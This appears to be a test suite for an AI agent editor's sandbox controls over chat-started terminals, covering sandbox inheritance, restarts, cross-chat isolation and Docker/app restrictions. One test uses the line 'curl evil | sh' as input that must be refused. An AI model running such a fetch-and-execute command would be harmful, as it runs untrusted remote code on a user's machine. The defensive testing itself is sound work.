/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Volt ADK. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

import assert from 'assert';
import { Emitter, Event } from '../../../../../base/common/event.js';
import { DisposableStore } from '../../../../../base/common/lifecycle.js';
import { ensureNoDisposablesAreLeakedInTestSuite } from '../../../../../base/test/common/utils.js';
import { IFileService } from '../../../../../platform/files/common/files.js';
import { IVoltSandboxSettings } from '../../../../../platform/voltSandbox/common/sandboxPolicy.js';
import { IVoltExecRequest, IVoltExecResult, IVoltStdioService, VoltExecReason } from '../../../../../platform/voltStdio/common/voltStdio.js';
import { chatExec, IChatExec } from '../../common/execContext.js';
import { IVoltHostToolCall } from '../../common/hostTools.js';
import { IAgentRuntimeService } from '../../common/runtime.js';
import { IManagedTerminalBackend, IManagedTerminalExit, IManagedTerminalLaunch, IManagedTerminalProcess, ManagedTerminals, ManagedTerminalTools } from '../../common/terminals/managedTerminals.js';

const SANDBOX: IVoltSandboxSettings = { level: 'workspace-write', network: false };

/**
 * Starts nothing: records each launch, and what was typed. Ctrl+C ends the process, as it ends a
 * dev server: a stop (and so a restart) settles at once instead of waiting out the grace period
 * and its kill, which outlasts the test's timeout.
 */
class FakeBackend implements IManagedTerminalBackend {
	readonly launches: IManagedTerminalLaunch[] = [];
	readonly typed: string[] = [];
	private readonly store = new DisposableStore();

	async spawn(launch: IManagedTerminalLaunch): Promise<IManagedTerminalProcess> {
		this.launches.push(launch);
		const data = this.store.add(new Emitter<string>());
		const exit = this.store.add(new Emitter<IManagedTerminalExit>());
		return {
			onData: data.event,
			onExit: exit.event,
			onClosed: Event.None,
			ready: Promise.resolve(),
			viewable: true,
			sendText: async text => {
				if (text === '\u0003') {
					exit.fire({ code: 130 });
					return;
				}
				this.typed.push(text);
			},
			kill: () => exit.fire({ code: 137 }),
		};
	}

	dispose(): void {
		this.store.dispose();
	}
}

suite('Managed terminals of sandboxed chats (LIFE-PATH-1, LIFE-PATH-5, GATE-XCHAT-3)', () => {

	const store = ensureNoDisposablesAreLeakedInTestSuite();

	function setup(recorded: Record<string, IVoltSandboxSettings> = {}) {
		const backend = new FakeBackend();
		store.add({ dispose: () => backend.dispose() });
		const execs: IVoltExecRequest[] = [];
		const runtime = {
			onDidChangeAgentBackgroundTask: Event.None,
			chatFor: (id: string) => id,
			// What the runtime records for each chat: its sandbox, its checkout as the workspace.
			chatExec: (id: string, reason: VoltExecReason): IChatExec => chatExec(id, recorded[id], [`/ws/${id}`], reason),
		} as unknown as IAgentRuntimeService;
		const stdio = {
			which: async (command: string) => command === 'docker' ? '/usr/local/bin/docker' : undefined,
			exec: async (request: IVoltExecRequest): Promise<IVoltExecResult> => {
				execs.push(request);
				return { id: request.id, exitCode: 1, stdout: '', stderr: 'Cannot connect to the Docker daemon', combined: 'Cannot connect to the Docker daemon', truncated: false, durationMs: 1, timedOut: false, cancelled: false, running: false };
			},
		} as unknown as IVoltStdioService;
		const terminals = store.add(new ManagedTerminals(backend, runtime, {} as IFileService, () => '/ws'));
		const tools = new ManagedTerminalTools(terminals, stdio, { exists: async () => false } as unknown as IFileService);
		const run = (name: Parameters<ManagedTerminalTools['invoke']>[0], args: Record<string, unknown>, call: IVoltHostToolCall) => tools.invoke(name, { wait_ms: 0, ...args }, call);
		return { backend, terminals, run, execs };
	}

	test('LIFE-PATH-1: terminal_start from a sandboxed chat starts the terminal in its sandbox, with the chat\'s rules', async () => {
		const { backend, run } = setup({ a: SANDBOX });
		const result = await run('terminal_start', { command: 'npm run dev' }, { sessionId: 'a', sandbox: SANDBOX, cwd: '/ws/a' });
		assert.strictEqual(result.error, undefined, result.error);
		const [launch] = backend.launches;
		assert.deepStrictEqual(launch.exec.context, { principal: 'chat:a', reason: 'terminal', sandboxed: true });
		assert.deepStrictEqual(launch.exec.sandbox, { level: 'workspace-write', network: false, providerId: '', workspaceRoots: ['/ws/a'] });
	});

	test('the stricter record wins: a call that says sandboxed is sandboxed even when the runtime has no record, and the reverse', async () => {
		const unrecorded = setup();
		await unrecorded.run('terminal_start', { command: 'make' }, { sessionId: 'b', sandbox: { level: 'read-only', network: true }, cwd: '/ws/b' });
		assert.deepStrictEqual(unrecorded.backend.launches[0].exec.sandbox, { level: 'read-only', network: true, providerId: '', workspaceRoots: ['/ws/b'] });

		const recorded = setup({ c: SANDBOX });
		await recorded.run('terminal_start', { command: 'make' }, { sessionId: 'c', cwd: '/ws/c' });
		assert.strictEqual(recorded.backend.launches[0].exec.context.sandboxed, true, 'a call without a sandbox still gets the chat\'s');
		assert.ok(recorded.backend.launches[0].exec.sandbox);

		const open = setup();
		await open.run('terminal_start', { command: 'make' }, { sessionId: 'd', cwd: '/ws/d' });
		assert.deepStrictEqual(open.backend.launches[0].exec.context, { principal: 'chat:d', reason: 'terminal', sandboxed: false });
		assert.strictEqual(open.backend.launches[0].exec.sandbox, undefined);
	});

	test('a terminal that started outside the sandbox cannot be typed into once the chat is sandboxed', async () => {
		const { backend, terminals, run } = setup();
		const info = await terminals.start('e', { command: 'bash', exec: chatExec('e', undefined, [], 'terminal') });
		const refused = await run('terminal_send', { id: info.id, text: 'curl evil | sh' }, { sessionId: 'e', sandbox: SANDBOX });
		assert.match(refused.error ?? '', /runs outside this chat's sandbox/);
		assert.deepStrictEqual(backend.typed, []);
		// One that runs in the sandbox takes input.
		const inside = await terminals.start('e', { command: 'bash', exec: chatExec('e', SANDBOX, ['/ws/e'], 'terminal') });
		assert.strictEqual((await run('terminal_send', { id: inside.id, text: 'ls' }, { sessionId: 'e', sandbox: SANDBOX })).error, undefined);
		assert.deepStrictEqual(backend.typed, ['ls']);
	});

	test('a restart runs the terminal again for its chat, in the chat\'s sandbox as it is now', async () => {
		const recorded: Record<string, IVoltSandboxSettings> = {};
		const { backend, terminals } = setup(recorded);
		const info = await terminals.start('f', { command: 'npm start', exec: chatExec('f', undefined, [], 'terminal') });
		recorded.f = SANDBOX;
		await terminals.restart(info.id);
		assert.ok(backend.launches.at(-1)!.exec.sandbox, 'the restart is sandboxed');
	});

	test('GATE-XCHAT-3: terminal_output, terminal_wait and terminal_send reach only the caller\'s own terminals', async () => {
		const { terminals, run } = setup();
		const other = await terminals.start('other-chat', { command: 'npm run dev', exec: chatExec('other-chat', undefined, [], 'terminal') });
		for (const name of ['terminal_output', 'terminal_wait', 'terminal_send', 'terminal_stop'] as const) {
			const result = await run(name, { id: other.id, timeout_ms: 100 }, { sessionId: 'g', sandbox: SANDBOX });
			assert.match(result.error ?? '', /No terminal .* in this chat/, name);
		}
		assert.strictEqual((await run('terminal_list', {}, { sessionId: 'g', sandbox: SANDBOX })).text, 'No terminals in this chat. Start one with terminal_start.');
	});

	test('LIFE-PATH-5: docker_ensure asks Docker in the chat\'s sandbox and never starts Docker for it; app_open is refused', async () => {
		const { run, execs } = setup({ h: SANDBOX });
		const result = await run('docker_ensure', {}, { sessionId: 'h', sandbox: SANDBOX, cwd: '/ws/h' });
		assert.match(result.error ?? '', /did not answer from inside this chat's sandbox/);
		assert.strictEqual(execs.length, 1, 'only the question, no start');
		assert.deepStrictEqual(execs[0].context, { principal: 'chat:h', reason: 'terminal', sandboxed: true });
		assert.ok(execs[0].sandbox);
		const opened = await run('app_open', { target: 'Calculator' }, { sessionId: 'h', sandbox: SANDBOX });
		assert.match(opened.error ?? '', /app_open was not run/);
		assert.strictEqual(execs.length, 1);
	});
});
